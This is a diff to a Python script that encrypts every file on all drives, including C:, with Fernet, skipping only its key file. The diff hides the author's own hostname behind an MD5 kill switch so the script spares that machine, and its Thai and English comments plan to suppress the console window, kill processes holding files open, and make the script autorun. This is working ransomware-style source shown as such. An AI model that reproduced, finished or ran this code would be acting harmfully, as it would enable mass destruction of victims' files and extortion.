@@ -1,8 +1,8 @@
-import os, subprocess, time
+import os, subprocess, time, hashlib
 from cryptography.fernet import Fernet
 #อาจจะต้อง task kill process ที่ไม่ใช่เราทเเละ window ทั้งหมดด้วย เพื่อ ให้ไม่เออเร่อว่ากำลังอ่านไฟล์อยู่
-#ไม่ให้จอ cmd เด้งออกมา pyinstaller --noconsole --onefile 
-#ใส่เบรกว่าถ้าชื่อเครื่องเป็นเรา ไม่รัน
+#ไม่ให้จอ cmd เด้งออกมา pyinstaller --noconsole --onefile
+# make it autorun 
 class encrypt(object):
     """
     docstring
@@ -35,7 +35,7 @@ class encrypt(object):
                 writemode ='a'
             else:
                 writemode ='w'
-            with open('errorfile.txt',writemode,encoding='utf-8'):
+            with open('errorfile.txt',writemode,encoding='utf-8') as f:
                 f.write(p.stderr)
                 f.write('\n')
         return p.stdout.split(':')[0]    
@@ -47,9 +47,9 @@ class encrypt(object):
         then run encrypt c
         """
         exclude = self.FindMainDrive()
-        path = [i for i in encrypt.generatedirlist() if i.lower() != exclude.lower()+':\\']
-        for i in path:
-            for root,_,files in os.walk(i):
+        path = [i for i in encrypt.generatedirlist() if i.lower() != exclude.lower()+':\\']                 #comment this line for test
+        for i in path:                                                                                      #comment this line for test
+            for root,_,files in os.walk(i):                                                                 #change i to '.' for test 
                 for name in files:
                     if name!='keyfile.txt':
                         walkingdir = os.path.join(root,name)
@@ -73,7 +73,7 @@ class encrypt(object):
                             else:
                                 writemode ='w'
                             with open('errorfile.txt',writemode,encoding='utf-8'):
-                                f.write(exception)
+                                f.write(str(exception))
                                 f.write('\n')
     def runinC(self):
         """
@@ -104,27 +104,27 @@ class encrypt(object):
                         else:
                                 writemode ='w'
                         with open('errorfile.txt',writemode,encoding='utf-8'):
-                            f.write(exception)
+                            f.write(str(exception))
                             f.write('\n')
     @staticmethod
     def EmergencyBreak():
         cmd ='hostname'
         p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True)
         return p.stdout[:-1]
-        #DESKTOP-3E4AAU5
                 
 if __name__ == "__main__":
+    hash = hashlib.md5(encrypt.EmergencyBreak().encode('utf-8')).hexdigest()
     try:
-        if encrypt.EmergencyBreak()=='DESKTOP-3E4AAU5':
-            exit()
+        if hash =='8abe12940cc6d19c7984cbe78ebe6213':#break on my machine                             #Comment this line for test 
+            exit()                                                                                        #Comment this line for test
         testobj = encrypt()
         testobj.run()
-        testobj.runinC()
+        testobj.runinC()                                                                                  #Comment this line for test
     except Exception as exception:
-        if os.path.exists('errorslog.txt'):
+        if os.path.exists('errorfile.txt'):
             writemode = 'a'
         else:
             writemode ='w'
-        with open('errorslog.txt',writemode,encoding='utf-8')as f:
-            f.write(exception)
+        with open('errorfile.txt',writemode,encoding='utf-8')as f:
+            f.write(str(exception))
             f.write('\n')    
